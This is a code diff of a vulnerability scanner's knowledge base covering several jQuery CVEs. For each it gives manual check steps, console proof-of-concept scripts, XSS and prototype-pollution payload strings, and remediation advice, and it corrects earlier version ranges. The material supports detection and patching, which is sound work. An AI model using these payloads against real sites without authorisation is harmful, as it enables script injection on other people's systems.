@@ -13,121 +13,204 @@ logger = logging.getLogger(__name__)
 # CVE Knowledge Base — manual verification steps + PoC per finding type
 # ==============================================================================
 CVE_KNOWLEDGE = {
+    # CVE-2019-11358: Prototype Pollution via $.extend()
+    # BUG FIX: affected was '< 3.5.0' -- actual fix was in 3.4.0
     'CVE-2019-11358': {
         'title': 'jQuery $.extend() Prototype Pollution',
-        'affected': 'jQuery < 3.5.0',
+        'affected': 'jQuery >= 1.0.3, < 3.4.0',
         'severity': 'CRITICAL',
         'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2019-11358',
         'description': (
             'jQuery $.extend(true, ...) performs deep merge without checking '
             'for __proto__ keys, allowing an attacker to inject properties '
-            'into Object.prototype that affect all JavaScript objects.'
+            'into Object.prototype that affect all JavaScript objects. '
+            'Fixed in jQuery 3.4.0 (NOT 3.5.0 as commonly misreported).'
         ),
         'manual_steps': [
             'Open target URL in browser',
-            'Press F12 → Console tab',
-            'Run: $.extend(true, {}, JSON.parse(\'{"__proto__": {"pptest": true}}\'))',
-            'Run: console.log(({}).pptest)  →  should print "true" if vulnerable',
+            'Press F12 -> Console tab',
+            "Run: $.extend(true, {}, JSON.parse('{\"__proto__\": {\"pptest\": true}}')",
+            'Run: console.log(({}).pptest)  ->  should print "true" if vulnerable',
             'Run: delete Object.prototype.pptest  (cleanup)',
             'Screenshot the console output as evidence',
         ],
-        'poc_script': '''\
-// CVE-2019-11358 — Prototype Pollution PoC
+        'poc_script': '''// CVE-2019-11358 -- Prototype Pollution PoC
 (function() {
     var marker = 'ppmap_poc_' + Date.now();
     $.extend(true, {}, JSON.parse('{"__proto__": {"' + marker + '": "POLLUTED"}}'));
     if (({})[ marker ] === 'POLLUTED') {
-        console.log('✅ VULNERABLE: Object.prototype.' + marker + ' = "POLLUTED"');
+        console.log('VULNERABLE: Object.prototype.' + marker + ' = "POLLUTED"');
         delete Object.prototype[marker];
     } else {
-        console.log('❌ Not vulnerable or already patched');
+        console.log('Not vulnerable or already patched');
     }
 })();''',
         'xss_payloads': [
-            '$.extend(true, {}, JSON.parse(\'{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}\'))',
-            '$.extend(true, {}, JSON.parse(\'{"__proto__": {"src": "data:,alert(1)//"}}\'))',
+            "$.extend(true, {}, JSON.parse('{\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}}'))",
         ],
         'remediation': [
-            'Upgrade jQuery to >= 3.5.0 (patch released 2020-04-10)',
+            'Upgrade jQuery to >= 3.4.0 for PP fix, >= 3.5.0 for full XSS fix',
             'Replace $.extend(true, ...) with Object.assign() or spread syntax',
             'Apply Content Security Policy (CSP) headers',
             'Use Object.freeze(Object.prototype) in critical paths',
         ],
     },
+    # CVE-2020-11022: HTML Prefilter XSS
     'CVE-2020-11022': {
-        'title': 'jQuery HTML Prefilter XSS',
+        'title': 'jQuery HTML Prefilter XSS via .html()/.append()',
         'affected': 'jQuery >= 1.2, < 3.5.0',
         'severity': 'HIGH',
         'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11022',
         'description': (
-            'jQuery sanitizes HTML via a regex prefilter before passing it to '
-            'the browser. The regex fails on certain nested tag combinations '
-            '(e.g. <option><style></option>), allowing XSS when untrusted '
-            'HTML is passed to $().html(), $().append(), or similar methods.'
+            'jQuery htmlPrefilter() uses a regex-only approach to neutralize self-closing tags. '
+            'Payloads like <style></style><img onerror=...> bypass the regex and execute '
+            'when passed to .html(), .append(), .after(), .before() etc. '
+            'NOTE: <option><style></option> pattern is CVE-2020-11023, NOT this CVE.'
         ),
         'manual_steps': [
             'Open target URL in browser',
-            'Press F12 → Console tab',
+            'Press F12 -> Console tab',
             'Run the PoC script below',
-            'If an alert box pops up, the page is vulnerable',
-            'Screenshot the alert + console output as evidence',
+            'If _cve22_ is true after 500ms, page is vulnerable',
         ],
-        'poc_script': '''\
-// CVE-2020-11022 — HTML Prefilter XSS PoC
+        'poc_script': '''// CVE-2020-11022 -- htmlPrefilter XSS PoC
+// BUG FIX: old PoC used <option><style></option> which is CVE-2020-11023!
+// CVE-2020-11022: <style></style><img onerror> bypasses htmlPrefilter regex
 (function() {
+    window._cve22_ = false;
     var d = $('<div>').css('display','none').appendTo('body');
     try {
-        d.html('<option><style></option><img src=x onerror="alert(\\\'CVE-2020-11022\\\')">');
-        console.log('✅ Payload injected — if alert fires, XSS confirmed');
-    } catch(e) {
-        console.log('❌ Error: ' + e.message);
-    }
-    setTimeout(function(){ d.remove(); }, 3000);
+        d.html('<style></style><img src=x onerror="window._cve22_=true">');
+        setTimeout(function(){
+            console.log(window._cve22_ ? 'CVE-2020-11022 TRIGGERED' : 'NOT triggered');
+            d.remove();
+        }, 500);
+    } catch(e) { d.remove(); }
 })();''',
         'xss_payloads': [
-            "<option><style></option><img src=x onerror=alert(document.domain)>",
-            "<option><style></option><svg onload=alert('XSS')>",
+            '<style></style><img src=x onerror=alert(document.domain)>',
+            '<style></style><svg onload=alert(1)>',
         ],
         'remediation': [
             'Upgrade jQuery to >= 3.5.0',
             'Use DOMPurify to sanitize HTML before $.html()/.append()',
             'Never pass untrusted input directly to jQuery DOM methods',
-            'Set CSP header: script-src \'self\'',
+            "Set CSP header: script-src 'self'",
         ],
     },
-    'CVE-2015-9251': {
-        'title': 'jQuery XSS via CSS import / cross-domain AJAX',
-        'affected': 'jQuery < 2.2.0 / < 1.12.0',
+    # CVE-2020-11023: <option> element XSS -- was MISSING from CVE_KNOWLEDGE
+    'CVE-2020-11023': {
+        'title': 'jQuery <option> element XSS via .html()/.append()',
+        'affected': 'jQuery >= 1.0.3, < 3.5.0',
         'severity': 'HIGH',
-        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2015-9251',
+        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-11023',
         'description': (
-            'When making cross-domain AJAX requests, jQuery 1.x/2.x does not '
-            'set the dataType explicitly, causing the response to be treated '
-            'as JavaScript if the Content-Type header is text/javascript. '
-            'An attacker controlling the CORS response can execute arbitrary JS.'
+            'Passing HTML containing <option> elements with untrusted content to jQuery '
+            'DOM manipulation methods can execute arbitrary code. Added to CISA KEV. '
+            'Pattern: <option><img src=x onerror=...></option>'
         ),
         'manual_steps': [
-            'Check jQuery version in Console: jQuery.fn.jquery',
-            'Verify AJAX endpoints accept cross-origin requests',
-            'Test if $.ajax() calls lack explicit dataType parameter',
-            'Check CSP headers for unsafe-inline/unsafe-eval',
+            'Press F12 -> Console tab',
+            'Run the PoC script below',
+            'If _cve23_ is true after 500ms, page is vulnerable',
         ],
-        'poc_script': '''\
-// CVE-2015-9251 — Version Check
-console.log("jQuery version: " + jQuery.fn.jquery);
-if (jQuery.fn.jquery < "2.2.0") {
-    console.log("✅ VULNERABLE to CVE-2015-9251");
-} else {
-    console.log("❌ Patched or not affected");
-}''',
+        'poc_script': '''// CVE-2020-11023 -- <option> element XSS PoC
+(function() {
+    window._cve23_ = false;
+    var sel = $('<select>').css('display','none').appendTo('body');
+    sel.html('<option><img src=x onerror="window._cve23_=true"></option>');
+    setTimeout(function(){
+        console.log(window._cve23_ ? 'CVE-2020-11023 TRIGGERED' : 'NOT triggered');
+        sel.remove();
+    }, 500);
+})();''',
+        'xss_payloads': [
+            '<option><img src=x onerror=alert(document.domain)></option>',
+        ],
+        'remediation': [
+            'Upgrade jQuery to >= 3.5.0',
+            'Sanitize HTML before passing to .html()/.append()',
+        ],
+    },
+    # CVE-2020-23064: DOM Manipulation XSS -- was MISSING from CVE_KNOWLEDGE
+    'CVE-2020-23064': {
+        'title': 'jQuery DOM Manipulation XSS (.append/.before/.after)',
+        'affected': 'jQuery >= 1.0.3, < 3.5.0',
+        'severity': 'HIGH',
+        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2020-23064',
+        'description': (
+            'jQuery DOM manipulation methods .before(), .after(), .replaceWith(), .append() '
+            'do not sanitize HTML, allowing XSS when user data is passed without sanitization. '
+            'Pattern: .append("<img/><img src=x onerror=...>")'
+        ),
+        'manual_steps': [
+            'Press F12 -> Console tab',
+            'Run the PoC script below',
+            'If _cve64_ is true after 500ms, page is vulnerable',
+        ],
+        'poc_script': '''// CVE-2020-23064 -- DOM Manipulation XSS PoC
+(function() {
+    window._cve64_ = false;
+    var d = $('<div>').css('display','none').appendTo('body');
+    d.append('<img/><img src=x onerror="window._cve64_=true">');
+    setTimeout(function(){
+        console.log(window._cve64_ ? 'CVE-2020-23064 TRIGGERED' : 'NOT triggered');
+        d.remove();
+    }, 500);
+})();''',
+        'xss_payloads': [
+            '<img/><img src=x onerror=alert(document.domain)>',
+        ],
+        'remediation': [
+            'Upgrade jQuery to >= 3.5.0',
+            'Never pass user-controlled strings to .before()/.after()/.append()',
+        ],
+    },
+    # CVE-2015-9251: Cross-domain AJAX auto-eval XSS
+    # BUG FIX 1: severity was HIGH, NVD says MEDIUM
+    # BUG FIX 2: affected was '< 2.2.0 / < 1.12.0' -- correct: >= 1.0, < 3.0.0
+    # BUG FIX 3: title/description said 'CSS import' -- correct: AJAX auto-eval globalEval
+    # BUG FIX 4: PoC version check was < 2.2.0 -- should check globalEval converter
+    'CVE-2015-9251': {
+        'title': 'jQuery Cross-domain AJAX auto-eval XSS',
+        'affected': 'jQuery >= 1.0, < 3.0.0',
+        'severity': 'MEDIUM',
+        'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2015-9251',
+        'description': (
+            'When jQuery makes cross-domain AJAX requests without specifying dataType, '
+            "responses with Content-Type: text/javascript are auto-eval'd via globalEval(). "
+            'converters["text script"] = globalEval is present in all 1.x/2.x versions. '
+            'Fixed in jQuery 3.0.0 which removed the auto-eval converter.'
+        ),
+        'manual_steps': [
+            'Check jQuery version: jQuery.fn.jquery (must be < 3.0.0)',
+            'Run: typeof jQuery.ajaxSettings.converters["text script"] === "function"',
+            'If result is TRUE, the auto-eval converter is ACTIVE (vulnerable)',
+            'Find AJAX requests lacking explicit dataType in Network tab',
+        ],
+        'poc_script': '''// CVE-2015-9251 -- AJAX auto-eval converter check
+// BUG FIX: old PoC only checked version < 2.2.0 (wrong range, was also wrong pattern)
+(function() {
+    var ver = jQuery.fn.jquery;
+    console.log("jQuery version: " + ver);
+    var conv = jQuery.ajaxSettings && jQuery.ajaxSettings.converters;
+    var active = conv && typeof conv["text script"] === "function";
+    if (active) {
+        console.log("VULNERABLE to CVE-2015-9251 (jQuery < 3.0.0)");
+        console.log("converters[text script] = globalEval is ACTIVE");
+    } else {
+        console.log("Converter not active -- jQuery >= 3.0.0 or patched");
+    }
+})();''',
         'xss_payloads': [],
         'remediation': [
-            'Upgrade jQuery to >= 3.0.0 (or 1.12.0 / 2.2.0 for LTS)',
-            'Always specify dataType in $.ajax() calls',
-            'Implement strict CORS policy',
+            'Upgrade jQuery to >= 3.0.0 (auto-eval converter removed)',
+            'Always specify dataType in $.ajax() calls: dataType: "json"',
+            'Implement strict CORS policy on server',
         ],
     },
 }
+
 
 CONSTRUCTOR_PP_KNOWLEDGE = {
     'title': 'Constructor-based Prototype Pollution',
